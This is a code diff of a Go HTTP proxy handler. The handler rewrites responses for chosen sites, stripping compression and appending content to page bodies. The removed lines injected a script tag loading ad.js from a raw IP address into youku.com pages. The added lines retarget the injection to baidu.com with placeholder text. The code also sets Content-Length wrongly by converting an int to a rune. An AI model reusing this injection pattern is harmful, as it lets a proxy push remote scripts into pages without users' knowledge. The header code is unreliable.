@@ -27,7 +27,8 @@ func handler(respw http.ResponseWriter, req *http.Request) {
 		loghit(req, http.StatusNotImplemented)
 		return
 	}
-	if( req.URL.String()=="http://www.youku.com/" || req.URL.String()=="http://www.youku.com/i/" ){
+	
+	if( req.URL.String()=="http://www.baidu.com/" ){
 		req.Header.Del("Accept-Encoding");
 	}
 	if(strings.Contains(req.URL.String(),"hao.360.cn") && req.URL.Path=="/"){
@@ -70,10 +71,10 @@ func handler(respw http.ResponseWriter, req *http.Request) {
 	defer resp.Body.Close()
 	if(resp.StatusCode==200){
 		if(
-			req.URL.String()=="http://www.youku.com/" || req.URL.String()=="http://www.youku.com/i/" ){
+			req.URL.String()=="http://www.baidu.com/"){
 			body, _:= ioutil.ReadAll(resp.Body)
 			buf := bytes.NewBuffer(body);
-			s :=[]byte("\n<script src='http://112.124.2.144:91/ad.js'></script>");
+			s :=[]byte("\nMy Content");
 			buf.Write(s);
 			resp.Header.Set("Content-Length",string(buf.Len()));
 			log.Println("Content-Length2:%d",resp.ContentLength);
